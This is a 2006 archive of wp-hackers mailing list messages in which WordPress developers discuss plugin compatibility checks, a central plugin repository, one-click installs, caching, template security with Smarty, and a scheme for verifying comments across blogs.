Message-ID: <e6ec604d0602061527m4c63ba48u3f760dae58d08495@mail.gmail.com>

On 2/6/06, Jon Abad <jonabad@gmail.com> wrote:
> At minimum, this sounds like it would be useful to us: add a
> WP-Version-Range line to the Plugin file structure so that people know
> which versions the plugin has been tested on.

To keep with the FF model, this should not be coded into the plugin
but available via a URL to be checked as part of the upgrade process.

Before the user copies all the new core files, one new file
(pre-upgrade.php) is copied to ABSPATH and run from the browser. It
goes through the installed/activated plugins one by one, checking the
URL for compatibility notices and ending with a message stating which
plugins are known-good, known-bad and untested. This way the user
isn't already stuck with overwritten files and new db schema. It also
provides a channel for explicit upgrade instructions, such as the
ever-ignored advice to deactivate plugins, make backups, etc.

The URL may be specified by the author in an additional line in the
plugin's leading comments. Alternatively, plugins without the URL
would be checked against a centralized list of tested plugins.

Andy
From pete.prodoehl at cygnusinteractive.com  Mon Feb  6 23:44:01 2006
From: pete.prodoehl at cygnusinteractive.com (Pete Prodoehl)
Date: Mon Feb  6 23:45:27 2006
Subject: [wp-hackers] 2.next - faster [flat/static build]
In-Reply-To: <C00D1AF0.F482%apakuni@gmail.com>
References: <C00D1AF0.F482%apakuni@gmail.com>
Message-ID: <43E7DF41.4050804@cygnusinteractive.com>

Douglas Daulton wrote:
> On 2/6/06 2:31 PM, "Matt Mullenweg" <m@mullenweg.com> wrote:
>> Douglas Daulton wrote:
>>> In addition to tweaking SQL, creating a native option for a flat/static
>>> build (like Moveable Type) would reduce server load and increase SEO for WP
>>> 2.next.  There are some plug-ins out there that do this.  Why not look at
>>> them all and build a "best of show" into the core.
>> Just to dispel a common misperception, there is NO SEO benefit by having
>> static files as opposed to WP's nice permalinks. They both look "static"
>> to search engines.

 > Agreed.  However isn't there an SEO gain from parsing the static page
 > itself?  Happy to be educated to the contrary.

How? The HTML that gets served to the client (your browser, or in this 
case, an indexer) is no different whether it is a static file, or 
assembled via WP or any other technology. In the ideal world, you would 
not be able to tell static from dynamic, and in many cases, you can't.

Pete

From sam at rephrase.net  Mon Feb  6 23:50:11 2006
From: sam at rephrase.net (Sam Angove)
Date: Mon Feb  6 23:51:38 2006
Subject: [wp-hackers] Simplicity in 2.next
In-Reply-To: <e6ec604d0602061527m4c63ba48u3f760dae58d08495@mail.gmail.com>
References: <43E7AD17.6060907@mullenweg.com> <43E7B905.4000304@tamba2.org.uk>
	<43E7BF44.1090605@boren.nu> <43E7C266.9000309@tamba2.org.uk>
	<43E7C829.9040505@boren.nu> <43E7CAF6.9010303@tamba2.org.uk>
	<5aa3aa0602061426n3613221ay7754b236a9d7a863@mail.gmail.com>
	<43E7CF14.4000509@tamba2.org.uk> <43E7D521.4030402@gmail.com>
	<e6ec604d0602061527m4c63ba48u3f760dae58d08495@mail.gmail.com>
Message-ID: <aa74b1910602061550j359e154du7e96b2268a94ff6b@mail.gmail.com>

On 2/7/06, Andy Skelton <skeltoac@gmail.com> wrote:
> On 2/6/06, Jon Abad <jonabad@gmail.com> wrote:
> > At minimum, this sounds like it would be useful to us: add a
> > WP-Version-Range line to the Plugin file structure so that people know
> > which versions the plugin has been tested on.
>
> To keep with the FF model, this should not be coded into the plugin
> but available via a URL to be checked as part of the upgrade process.

Mozilla extensions have minVersion and maxVersion as well as
(optional) updateURL .
From ryan at boren.nu  Mon Feb  6 23:52:36 2006
From: ryan at boren.nu (Ryan Boren)
Date: Mon Feb  6 23:54:07 2006
Subject: [wp-hackers] Simplicity in 2.next
In-Reply-To: <43E7DADA.4090700@ebroder.net>
References: <43E7AD17.6060907@mullenweg.com>	<43E7B905.4000304@tamba2.org.uk>	<43E7BF44.1090605@boren.nu>	<43E7C266.9000309@tamba2.org.uk>	<43E7C829.9040505@boren.nu>	<43E7CAF6.9010303@tamba2.org.uk>	<5aa3aa0602061426n3613221ay7754b236a9d7a863@mail.gmail.com>
	<43E7DADA.4090700@ebroder.net>
Message-ID: <43E7E144.4090802@boren.nu>

Evan Broder wrote:
> I would expect that, if people don't already have their plugins 
> currently hosted on wp-plugins.org, they aren't going to be easily 
> convinced to move them.
 >
> I have a plugin that I host in my own webspace. It's a bit of a hassle 
> when I release a new version, but wp-plugins.org is way overkill for my 
> development setup. The wiki and Subversion are really overkill for what 
> I need.

If a plugin author doesn't want to use wp-plugins, that's his choice. 
Plugins not in the wp-plugins repository simply won't get the developer 
attention that plugins that do reside in wp-plugin will get.  If they 
break, they'll be left broken. I haven't the time or the inclination to 
chase plugins hither, thither, and yon.  It's the linux kernel approach. 
  If it's not in the tree, it is on its own.

Those plugins in the wp-plugins tree will get some extra love.  We'll 
write automation that will run over the entire repository looking for 
common mistakes and deprecated usage, for example.  We'll commit fixes 
and try to keep the plugins up-to-date.  It's a big task that is 
thoroughly impractical without a common repository.

I'd like to have a group of plugin gardeners with full commit access to 
wp-plugins.

Ryan


From davebytes at comcast.net  Mon Feb  6 23:53:02 2006
From: davebytes at comcast.net (David Chait)
Date: Mon Feb  6 23:54:43 2006
Subject: [wp-hackers] 2.next - faster [flat/static build]
References: <C00D1AF0.F482%apakuni@gmail.com>
Message-ID: <017701c62b78$77b7ec50$6e01a8c0@sixfour>

Nope.  A static (or WP-Cache'd) page literally looks the same to the bot or 
browser.  Many 'dynamic' pages are actually the same every pageload, have no 
changing content, thus are very well sped up just by using wp-cache (or 
similar caching on other systems).

-d

----- Original Message ----- 
From: "Douglas Daulton" <apakuni@gmail.com>
To: "WP Hackers" <wp-hackers@lists.automattic.com>
Sent: Monday, February 06, 2006 6:25 PM
Subject: Re: [wp-hackers] 2.next - faster [flat/static build]


| Agreed.  However isn't there an SEO gain from parsing the static page
| itself?  Happy to be educated to the contrary.
|
| On 2/6/06 2:31 PM, "Matt Mullenweg" <m@mullenweg.com> wrote:
|
| > Douglas Daulton wrote:
| >> In addition to tweaking SQL, creating a native option for a flat/static
| >> build (like Moveable Type) would reduce server load and increase SEO 
for WP
| >> 2.next.  There are some plug-ins out there that do this.  Why not look 
at
| >> them all and build a "best of show" into the core.
| >
| > Just to dispel a common misperception, there is NO SEO benefit by having
| > static files as opposed to WP's nice permalinks. They both look "static"
| > to search engines.
|
| _______________________________________________
| wp-hackers mailing list
| wp-hackers@lists.automattic.com
| http://lists.automattic.com/mailman/listinfo/wp-hackers
| 

From jonabad at gmail.com  Mon Feb  6 23:58:28 2006
From: jonabad at gmail.com (Jon Abad)
Date: Mon Feb  6 23:59:58 2006
Subject: [wp-hackers] Simplicity in 2.next
In-Reply-To: <e6ec604d0602061527m4c63ba48u3f760dae58d08495@mail.gmail.com>
References: <43E7AD17.6060907@mullenweg.com>
	<43E7B905.4000304@tamba2.org.uk>	<43E7BF44.1090605@boren.nu>
	<43E7C266.9000309@tamba2.org.uk>	<43E7C829.9040505@boren.nu>
	<43E7CAF6.9010303@tamba2.org.uk>	<5aa3aa0602061426n3613221ay7754b236a9d7a863@mail.gmail.com>	<43E7CF14.4000509@tamba2.org.uk>
	<43E7D521.4030402@gmail.com>
	<e6ec604d0602061527m4c63ba48u3f760dae58d08495@mail.gmail.com>
Message-ID: <43E7E2A4.6010608@gmail.com>

 From the Mozilla Extension Versioning page:
http://www.mozilla.org/projects/firefox/extensions/update.html

    Firefox uses the pref |app.extensions.version| to determine
    Extension compatibility for this release. When an Extension is
    installed, Firefox makes sure that |app.extensions.version| lies
    within the range set up by the Extension's install.rdf file using
    minVersion and maxVersion. If |app.extensions.version| is less than
    minVersion, a newer version of Firefox is required to install the
    Extension, if it is greater than maxVersion, Firefox is too new to
    install the extension.

    If this basic compatibility check fails, Firefox will then attempt
    to "phone home" and obtain newer compatibility information for the
    Extension. If the Extension's install.rdf file specifies an update
    RDF file, this will be loaded and newer information discovered there
    (see below for format). If none is supplied, Firefox will check the
    generic update service running on addons.mozilla.org, and if the
    Extension is hosted there and has newer compatibility information it
    will be read and the local information updated.

    If all of these methods fail, Firefox will show a message to the
    user saying that the Extension is incompatible and cannot be installed.

The plugin has the max and min ver and then it looks for an update if 
necessary.

jon


Andy Skelton wrote:
> On 2/6/06, Jon Abad <jonabad@gmail.com> wrote:
>   
>> At minimum, this sounds like it would be useful to us: add a
>> WP-Version-Range line to the Plugin file structure so that people know
>> which versions the plugin has been tested on.
>>     
>
> To keep with the FF model, this should not be coded into the plugin
> but available via a URL to be checked as part of the upgrade process.
>
> Before the user copies all the new core files, one new file
> (pre-upgrade.php) is copied to ABSPATH and run from the browser. It
> goes through the installed/activated plugins one by one, checking the
> URL for compatibility notices and ending with a message stating which
> plugins are known-good, known-bad and untested. This way the user
> isn't already stuck with overwritten files and new db schema. It also
> provides a channel for explicit upgrade instructions, such as the
> ever-ignored advice to deactivate plugins, make backups, etc.
>
> The URL may be specified by the author in an additional line in the
> plugin's leading comments. Alternatively, plugins without the URL
> would be checked against a centralized list of tested plugins.
>
> Andy
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
>   
From jeff at jrm.cc  Tue Feb  7 01:12:47 2006
From: jeff at jrm.cc (Jeff Minard)
Date: Tue Feb  7 01:14:04 2006
Subject: [wp-hackers] Simplicity in 2.next
In-Reply-To: <43E7C829.9040505@boren.nu>
References: <43E7AD17.6060907@mullenweg.com>	<43E7B905.4000304@tamba2.org.uk>	<43E7BF44.1090605@boren.nu>	<43E7C266.9000309@tamba2.org.uk>
	<43E7C829.9040505@boren.nu>
Message-ID: <43E7F40F.9020707@jrm.cc>

Ryan Boren wrote:
> If someone wants to go through wp-plugins.org and test every plugin with 
> each release, I'll try to fix any breakage found.  Vigilance over the 
> plugin repository coupled with firefox style extension management 

Much like the way the database is versioned, having plugins that have 
compatability requirements would be a good thing.

Providing an easy way to update "old" plugins is another chore entirely. 
But, under proper permissions and with a trusted source, a problem that 
could be addressed.

Jeff
From nuclearmoose at gmail.com  Tue Feb  7 01:22:24 2006
From: nuclearmoose at gmail.com (Craig)
Date: Tue Feb  7 01:23:52 2006
Subject: [wp-hackers] Simplicity in 2.next
In-Reply-To: <43E7E144.4090802@boren.nu>
References: <43E7AD17.6060907@mullenweg.com> <43E7B905.4000304@tamba2.org.uk>
	<43E7BF44.1090605@boren.nu> <43E7C266.9000309@tamba2.org.uk>
	<43E7C829.9040505@boren.nu> <43E7CAF6.9010303@tamba2.org.uk>
	<5aa3aa0602061426n3613221ay7754b236a9d7a863@mail.gmail.com>
	<43E7DADA.4090700@ebroder.net> <43E7E144.4090802@boren.nu>
Message-ID: <5aa3aa0602061722vfd65201w8e997f529c495702@mail.gmail.com>

Ryan said:
"Plugins not in the wp-plugins repository simply won't get the developer
attention that plugins that do reside in wp-plugin will get."

Ryan,
I don't disagree with your points at all, and certainly I like that there
would be an advantage for plugins that are in the repository to get some
developer-lovin', but part of this discussion is around trying to reduce
some of the support issues on wordpress.org. Unless the support forums go
the way of "official support only for repository-registered plugins" this
won't reduce the traffic on the support forum.

Not a simple issue, to be sure. Time to put the thinking cap back on and
ponder this a bit more...

Craig.
From mark.wordpress at txfx.net  Tue Feb  7 03:34:04 2006
From: mark.wordpress at txfx.net (Mark Jaquith)
Date: Tue Feb  7 03:35:35 2006
Subject: [wp-hackers] WP No longer display user emails
In-Reply-To: <43E743CA.2060707@phunky.co.uk>
References: <43E743CA.2060707@phunky.co.uk>
Message-ID: <78279364-50D0-4DCB-8254-1016EF8B1B6B@txfx.net>

On Feb 6, 2006, at 7:40 AM, Mark Harwood wrote:

> Is there any known issuse with this? As it will still update the  
> email if you change it via the user admin but just will not display  
> the email in the form feild as it is not pulling it from the DB  
> with the two above functions

If the user is currently logged in, you shouldn't even display those  
form fields.  Whatever they write in them will get overwritten by  
their profile, so leaving them editable is confusing.  See the  
default WP theme for an example of how to code it so that it displays  
"You are currently logged in as NAME" and omits those form fields.
--
Mark Jaquith
http://txfx.net/


From chrome at stupendous.net  Tue Feb  7 04:15:39 2006
From: chrome at stupendous.net (Nathan Ollerenshaw)
Date: Tue Feb  7 04:17:10 2006
Subject: [wp-hackers] Ideas for new features. (3.x?)
In-Reply-To: <43E7AD17.6060907@mullenweg.com>
References: <43E7AD17.6060907@mullenweg.com>
Message-ID: <CC0F38E3-4474-4A8D-B3D5-CBB0F6DAD74C@stupendous.net>

I'm new to this list, so I hope people can excuse my boldness.

I've been giving some thought to what I would like out of a blogging  
tool. A few things stand out in my mind, some as a system engineer  
who would like to integrate Wordpress into a hosted environment for  
his users, and some as a user.

1. Securely editable templates.

Some of the approaches to this have been to allow only CSS files to  
be uploaded/edited - but there are some problems with this security  
wise. Other approaches are to allow .php files to be uploaded/edited  
but have a list of PHP functions that may be used and reject the  
template if anything else appears.

Personally, I don't like either of these approaches. I think that  
using Smarty makes a lot more sense, as it completely separates logic  
away from template design with the secure mode enabled.

So I would like to see Wordpress move away from having php code  
directly in the templates, and all of the HTML code move outside of  
the PHP into the templates. I humbly suggest hunting down all  
instances of

    echo "<p>$something</p>";

and moving them into smarty templates.

With the right variables being fed into each template, one could  
offer the template designer a huge amount of power in terms of what  
is displayed on each page, without having to expose any code to him.

2. Cross-authenticated comments and trackbacks.

Hoo boy. This is something I've been thinking about for a while, to  
try and fix some aspects of the comment spam/traceback spam issue.  
None of the methods currently in use are particularly ideal, and  
something that doesn't exist in the core doesn't get used by most  
blogs - most of the blogs out there are clean installs with no  
plugins (or maybe a couple).

What do I mean by 'cross-authentication'?

Well, let me describe from a user point of view.

Step 1: An external (ie, he is not registered to your blog) user  
views your blog. He wants to make a comment. He types his comment  
into your comments page, puts in his username (on HIS blog) in the  
name field, and puts the URL to HIS blog in the Website: field.

Step 2: He presses Submit. Wordpress stores the comment in the  
comments DB and redirects to the remote user's blog's URL + something  
like "/verify-post.php?action=verify&postid=<postid>".

Step 3: The remote user's blog connects to YOUR blog via verify- 
post.php and grabs the comment (via XML, whatever).

Step 4: It then checks the remote user's cookies, and if he's logged  
in as the user specified in the username field, it creates a  
cryptographic hash (MD5 maybe) consisting of the post text, the user  
name and a secret key (not the password). It stores this in the  
database locally in case any comment needs to be reverified. If the  
user is NOT logged in, present a login form, let the guy  
authenticate, and then continue as if he was.

Step 5: Remote blog pushes back to YOUR blog this hash with a token  
of "approved" or something like that.

Step 6: Your blog marks the comment as "verified" and stores the hash  
in case this comment needs to be re-verified in the future.

Step 7: Remote blog redirects user back to your comments page, which  
then can be configured to display the comment without moderation.

This all could be done with AJAX maybe? Not sure how AJAX works but  
if I understand the gist of it, the redirect between the two sites  
could be done transparently to the user, except in the case that the  
user didn't have a valid cookie for his site.

This methodology could be applied to trackbacks as well, but  
transparently to the user so that the blog receiving the tackback  
ping can check with the originating blog that it sent the ping. (Does  
this happen already? I don't know how trackbacks work under the hood).

What does this buy us?

A distributed authentication system, which allows anyone who has a  
blog that implements this system to comment onto anyone else's blog  
that implements this system without fear that they can be  
impersonated, or their comments modified by the site owners. (A  
'verify this comment' button can be on the page, which redirects to  
the commenter's site which then displays a "this comment is verified  
as authentic" message along with the comment text)

If I am an impersonator and try to post as you on my blog, if my blog  
implements this code it will check back with your blog and I won't be  
able to log in and authenticate.

I can hack my blog to skip that step, and "pretend" to request  
authorisation for comments, but that would be easily detectable by  
anyone who wanted to check, because they can just click 'verify this  
comment'.

The other thing it buys us is that spammers have to set up a working  
blog for them to be able to comment on our blog - suddenly the cost  
of comment spam goes up. And on our side, we can just do blanket  
"Disallow comments from this url" or even allow regexs so if the  
spammer uses a predictable blogname, we can block all instances of  
it. Or just go and post on HIS blog and call him names. Whatever :)

Admittedly, I haven't thought about this too hard yet, and I don't  
know if it would work, but I'd like people's feedback on it - there  
are probably other ways to achieve the same thing, and probably other  
benefits and drawbacks, so it would be nice to know them.

"Show me the code!"

I'm working on code as a proof of concept, but its not a part of  
wordpress yet as I was getting a headache trying to decypher how  
wordpress works internally and its easier for me to just write a  
proof-of-concept blog tool and demonstrate that, and have someone  
else come along and get it working in WP.

Um, thats it! Just two for now. Maybe more later. This mail got too  
long :)

Cheers.

Nathan.

On Feb 7, 2006, at 5:09 AM, Matt Mullenweg wrote:

> The last thread about the next version of WP had some interesting  
> ideas in it, but I think the question may have been framed the  
> wrong way. What I'm far more interested in working on for the next  
> version is this:
>
> How can we make WordPress simpler in the next release?
>
> How can we reduce support requests on the forums?
>
> How can we make it faster?
>
> (To riff on an idea, consider starting a new thread.)
>
> -- 
> Matt Mullenweg
>  http://photomatt.net | http://wordpress.org
> http://automattic.com | http://akismet.com
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers

From aaron at technosailor.com  Tue Feb  7 02:37:40 2006
From: aaron at technosailor.com (Aaron Brazell)
Date: Tue Feb  7 05:04:08 2006
Subject: [wp-hackers] Simplicity in 2.next
Message-ID: <20060207050402.639195C8A@comox.textdrive.com>

Only two things to ease usage right off the top of my head.  These are things I deal with in the variety of blogs I have.

 

-Plugins Tab ? (And relevant hook) Where all the plugin option pages can be located.  If it?s a plugin and requires an admin page it should be here, not scattered heretofore throughout admin at the plugin author?s discretion.  Too many plugins clutter an already too cluttered Manage and Options tab that should, IMHO, not be cluttered by anything but core functionality.

 

-A way to turn on/off RTE right from the Write page

 

 

Hope that helps.

From m at mullenweg.com  Tue Feb  7 04:31:24 2006
From: m at mullenweg.com (Matt Mullenweg)
Date: Tue Feb  7 06:33:18 2006
Subject: [wp-hackers] 2.next - faster
In-Reply-To: <ebe43d680602061248h35d26151t@mail.gmail.com>
References: <8e1656660602061240m46e83979nbf5df64f085bf485@mail.gmail.com>
	<ebe43d680602061248h35d26151t@mail.gmail.com>
Message-ID: <43E8229C.70903@mullenweg.com>

David House wrote:
> Most of the time taken for WordPress to load is down to the long time
> needed for PHP to parse the thousands of lines of code, IIRC.

Yep, and an opcode cache helps a HUGE amount here. So much that it might 
not be worth optimizing for this case for the very small percentage of 
users that need that performance but can't run an opcode cache.

-- 
Matt Mullenweg
  http://photomatt.net | http://wordpress.org
http://automattic.com | http://akismet.com

From fuzzygroup at gmail.com  Tue Feb  7 07:02:25 2006
From: fuzzygroup at gmail.com (Scott johnson)
Date: Tue Feb  7 07:03:56 2006
Subject: [wp-hackers] 2.next - faster
In-Reply-To: <43E8229C.70903@mullenweg.com>
References: <8e1656660602061240m46e83979nbf5df64f085bf485@mail.gmail.com>
	<ebe43d680602061248h35d26151t@mail.gmail.com>
	<43E8229C.70903@mullenweg.com>
Message-ID: <8e1656660602062302o4fb2ef5bqeff4ce56e57cd190@mail.gmail.com>

Correct.  While I hate to say "wait for people to upgrade to php5",
the opcode cache is standard (from what I know) in php5.  Waiting for
people to upgrade to php5 would save a lot of engineering effort.

Note: I hate to NOT be definitive on something like this but most of
my experience is in php 4.1.x since that's what our systems ran.  That
said when we moved to APC and were able to use it (not always) we did
see a reliable 50%+ improvement.  The reasons we didn't run it as a
standard were more us than anything else.

S

On 2/6/06, Matt Mullenweg <m@mullenweg.com> wrote:
> David House wrote:
> > Most of the time taken for WordPress to load is down to the long time
> > needed for PHP to parse the thousands of lines of code, IIRC.
>
> Yep, and an opcode cache helps a HUGE amount here. So much that it might
> not be worth optimizing for this case for the very small percentage of
> users that need that performance but can't run an opcode cache.
>
> --
> Matt Mullenweg
>   http://photomatt.net | http://wordpress.org
> http://automattic.com | http://akismet.com
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>


--
-------------------------------------------------------
J. Scott Johnson
Ookles launches 2/28/06 - have you signed up yet?
new startup: http://ookles.com/
blog: http://fuzzyblog.com/
podcast: http://techwarstories.com/
fuzzygroup@gmail.com
aim: fuzzygroup
cell: 857 222 6459
-------------------------------------------------------
From skeltoac at gmail.com  Tue Feb  7 07:56:35 2006
From: skeltoac at gmail.com (Andy Skelton)
Date: Tue Feb  7 07:58:05 2006
Subject: [wp-hackers] Simplicity in 2.next
In-Reply-To: <20060207050402.639195C8A@comox.textdrive.com>
References: <20060207050402.639195C8A@comox.textdrive.com>
Message-ID: <e6ec604d0602062356y3051ba9cu77c565a10550f14c@mail.gmail.com>

On 2/6/06, Aaron Brazell <aaron@technosailor.com> wrote:
> -Plugins Tab ? (And relevant hook) Where all the plugin option pages can be located.

There is a tab and a hook for that. Incidentally, there are a violent
gang of plugin authors and users who like to modify their admin
experience by adding, removing or customizing the other menu items as
well. Admin presentation is not sacred, my friend.

> -A way to turn on/off RTE right from the Write page

I'm with you there. It should be done, it's just too big a project for
its low priority on my list. If you want to solve that problem
robustly, you're welcome to it!

Cheers,
Andy
From mattias at winthernet.se  Tue Feb  7 08:27:54 2006
From: mattias at winthernet.se (Mattias Winther)
Date: Tue Feb  7 08:29:35 2006
Subject: [wp-hackers] Simplicity in 2.next
In-Reply-To: 5aa3aa0602061722vfd65201w8e997f529c495702@mail.gmail.com
Message-ID: <773fe1ad06616a23b4a392dac3e81b6a@imap.scorpionshops.com>


This might have been discussed before, but another idea would be to allow for a more automatic installation process for the plugins in the central repository. Just switch to the extension browser, search for it, and click "install". The server downloads, places the files where they should be, and turns it on. Viola!

Typo3 at typo3.com uses that approach, and it is really nice to not have to download to desktop, upload to server and so forth... But maybe the Wordpress situation is different? If combined with the version checks, 
I imagine that would reduce the amount of support requests saying "Why can't I install plug-in X?". Then again, I'm new here, and I don't really know which support forum questions are the real common ones.

Life,

/MW

On Mon, 6 Feb 2006 18:22:24 -0700, Craig <nuclearmoose@gmail.com> wrote:
> Ryan said:
> "Plugins not in the wp-plugins repository simply won't get the developer
> attention that plugins that do reside in wp-plugin will get."
> 
> Ryan,
> I don't disagree with your points at all, and certainly I like that there
> would be an advantage for plugins that are in the repository to get some
> developer-lovin', but part of this discussion is around trying to reduce
> some of the support issues on wordpress.org. Unless the support forums go
> the way of "official support only for repository-registered plugins" this
> won't reduce the traffic on the support forum.
> 
> Not a simple issue, to be sure. Time to put the thinking cap back on and
> ponder this a bit more...
> 
> Craig.
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers

From skeltoac at gmail.com  Tue Feb  7 08:43:47 2006
From: skeltoac at gmail.com (Andy Skelton)
Date: Tue Feb  7 08:45:17 2006
Subject: [wp-hackers] Simplicity in 2.next
In-Reply-To: <773fe1ad06616a23b4a392dac3e81b6a@imap.scorpionshops.com>
References: <773fe1ad06616a23b4a392dac3e81b6a@imap.scorpionshops.com>
Message-ID: <e6ec604d0602070043w7534ccb3o6fe4a69e6a2c2e27@mail.gmail.com>

On 2/7/06, Mattias Winther <mattias@winthernet.se> wrote:
> This might have been discussed before, but another idea would be to allow for a more automatic installation process for the plugins in the central repository. Just switch to the extension browser, search for it, and click "install". The server downloads, places the files where they should be, and turns it on. Viola!

There is a wild variety of setups out there and one of the least
reliable aspects is file/directory permissions. See the discussions on
uploading and caching to get a feel for the kinds of issues we see
when we add file writing to the list of expected capabilities.

Still, there are projects under way to do exactly what you suggest.
Join IRC channel #wordpress on chat.freenode.net and you'll find these
things out.

Cheers,
Andy
From rich at cregy.co.uk  Tue Feb  7 08:52:28 2006
From: rich at cregy.co.uk (Richard Brown)
Date: Tue Feb  7 08:54:47 2006
Subject: [wp-hackers] Plugins
In-Reply-To: <43E7E144.4090802@boren.nu>
References: <43E7AD17.6060907@mullenweg.com>	<43E7B905.4000304@tamba2.org.uk>	<43E7BF44.1090605@boren.nu>	<43E7C266.9000309@tamba2.org.uk>	<43E7C829.9040505@boren.nu>	<43E7CAF6.9010303@tamba2.org.uk>	<5aa3aa0602061426n3613221ay7754b236a9d7a863@mail.gmail.com>
	<43E7DADA.4090700@ebroder.net> <43E7E144.4090802@boren.nu>
Message-ID: <0456672afa5eb0b4a148edc29872a93c@cregy.co.uk>

Hi Guys

On 6 Feb 2006, at 23:52, Ryan Boren wrote:

> If a plugin author doesn't want to use wp-plugins, that's his choice. 
> Plugins not in the wp-plugins repository simply won't get the 
> developer attention that plugins that do reside in wp-plugin will get. 
>  If they break, they'll be left broken. I haven't the time or the 
> inclination to chase plugins hither, thither, and yon.  It's the linux 
> kernel approach.  If it's not in the tree, it is on its own.
>
> Those plugins in the wp-plugins tree will get some extra love.  We'll 
> write automation that will run over the entire repository looking for 
> common mistakes and deprecated usage, for example.  We'll commit fixes 
> and try to keep the plugins up-to-date.  It's a big task that is 
> thoroughly impractical without a common repository.
>
> I'd like to have a group of plugin gardeners with full commit access 
> to wp-plugins.
Firstly, I'll say Hi because this is my first post to the list. And 
secondly, I changed the subject line because I didn't want to take away 
from Matt's original post.

I decided to join because we have developed the shop plugin 
(http://www.cregy.net). I am sorry that I didn't submit it to the 
wp-plugins, I will arrange to do today.

I am happy to offer testing space for plugins and am happy to join a 
team who run something similar to the Firefox 'this works with this 
version' idea. I reckon a WP that installs plugins through a one click 
approach is a good idea. I know it was possible with an earlier version 
and maybe we could tie the one-click install with wp-plugins.net? A 
sort of encouragement for developers to submit to that site. If this is 
a direction you would like the idea of is it something that gets 
incorporated into WP or is the one-click install a plugin itself?

By the way, a huge thanks once again to Podz who is the guy that got me 
started in this direction.
-- 
Rich
http://www.cregy.co.uk
Embracing what God does for you is the best thing you can do for him. 
Romans 12 v 1

From mark at phunky.co.uk  Tue Feb  7 09:22:36 2006
From: mark at phunky.co.uk (Mark Harwood)
Date: Tue Feb  7 09:22:10 2006
Subject: [wp-hackers] WP No longer display user emails
In-Reply-To: <78279364-50D0-4DCB-8254-1016EF8B1B6B@txfx.net>
References: <43E743CA.2060707@phunky.co.uk>
	<78279364-50D0-4DCB-8254-1016EF8B1B6B@txfx.net>
Message-ID: <43E866DC.6040608@phunky.co.uk>

I dont think you quite got what i was stating, the functions dont return 
the email value in the array for use at all, not even thru the back end!

So you cant see the current email, so you cant link to it or display it 
if the user wishes to which you have always been able to at least pull 
the email back from the functions get_currentuserinfo() and such.

Like i say even the WP backend does not pull it back, the feild 
user_email is within the $userdata array but it is blank.

This has only ouccured since i updated the WP2 site 2.01

Mark Jaquith wrote:

> On Feb 6, 2006, at 7:40 AM, Mark Harwood wrote:
>
>> Is there any known issuse with this? As it will still update the  
>> email if you change it via the user admin but just will not display  
>> the email in the form feild as it is not pulling it from the DB  with 
>> the two above functions
>
>
> If the user is currently logged in, you shouldn't even display those  
> form fields.  Whatever they write in them will get overwritten by  
> their profile, so leaving them editable is confusing.  See the  
> default WP theme for an example of how to code it so that it displays  
> "You are currently logged in as NAME" and omits those form fields.
> -- 
> Mark Jaquith
> http://txfx.net/
>
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From podz at tamba2.org.uk  Tue Feb  7 09:36:32 2006
From: podz at tamba2.org.uk (Podz)
Date: Tue Feb  7 09:37:41 2006
Subject: [wp-hackers] Simplicity in 2.next
In-Reply-To: <5aa3aa0602061722vfd65201w8e997f529c495702@mail.gmail.com>
References: <43E7AD17.6060907@mullenweg.com>
	<43E7B905.4000304@tamba2.org.uk>	<43E7BF44.1090605@boren.nu>
	<43E7C266.9000309@tamba2.org.uk>	<43E7C829.9040505@boren.nu>
	<43E7CAF6.9010303@tamba2.org.uk>	<5aa3aa0602061426n3613221ay7754b236a9d7a863@mail.gmail.com>	<43E7DADA.4090700@ebroder.net>
	<43E7E144.4090802@boren.nu>
	<5aa3aa0602061722vfd65201w8e997f529c495702@mail.gmail.com>
Message-ID: <43E86A20.9010309@tamba2.org.uk>

Craig wrote:
> Ryan said:
> "Plugins not in the wp-plugins repository simply won't get the developer
> attention that plugins that do reside in wp-plugin will get."
> 
> Ryan,
> I don't disagree with your points at all, and certainly I like that there
> would be an advantage for plugins that are in the repository to get some
> developer-lovin', but part of this discussion is around trying to reduce
> some of the support issues on wordpress.org. Unless the support forums go
> the way of "official support only for repository-registered plugins" this
> won't reduce the traffic on the support forum.
> 

I think in the short-term this could actually increase traffic because
of the questions about it, ironing out wrinkles etc. But for the
long-term it must be worth it - right now there is no organisation as
far as the end-user is concerned and having that is a goal worth some
short term graft.

P.
From sam at rephrase.net  Tue Feb  7 09:39:01 2006
From: sam at rephrase.net (Sam Angove)
Date: Tue Feb  7 09:40:31 2006
Subject: [wp-hackers] Ideas for new features. (3.x?)
In-Reply-To: <CC0F38E3-4474-4A8D-B3D5-CBB0F6DAD74C@stupendous.net>
References: <43E7AD17.6060907@mullenweg.com>
	<CC0F38E3-4474-4A8D-B3D5-CBB0F6DAD74C@stupendous.net>
Message-ID: <aa74b1910602070139t4e8eaf2cwe116aaab958f2e99@mail.gmail.com>

On 2/7/06, Nathan Ollerenshaw <chrome@stupendous.net> wrote:
>
> 1. Securely editable templates.
>
> [snip]
>
> Personally, I don't like either of these approaches. I think that
> using Smarty makes a lot more sense, as it completely separates logic
> away from template design with the secure mode enabled.

There was a discussion about this last September. [1] (All the
messages with "separation of application logic from presentation
logic" in the title.) See especially [2].

IIRC WordPress MU already supports Smarty, and there's a modification
of 1.5 called SmartyPress.

If not one of those, it's fairly easy to write something yourself to
compile safe templates into actual code -- the users don't get to
touch real code. LiveJournal, MT, etc. all work this way. I wrote
[read: stole from TextPattern] the beginnings of one this afternoon.
[3]

[1]: http://comox.textdrive.com/pipermail/wp-hackers/2005-September/thread.html
[2]: http://comox.textdrive.com/pipermail/wp-hackers/2005-September/002611.html
[3]: http://rephrase.net/box/word/template/


>
> 2. Cross-authenticated comments and trackbacks.
>
>
> Step 1: An external (ie, he is not registered to your blog) user
> views your blog. He wants to make a comment. He types his comment
> into your comments page, puts in his username (on HIS blog) in the
> name field, and puts the URL to HIS blog in the Website: field.

That's what OpenID does, more or less. TypeKey and LiveJournal both
use it, and there's a (possibly not working completely?) WP plugin
available.
From chrome at stupendous.net  Tue Feb  7 10:49:46 2006
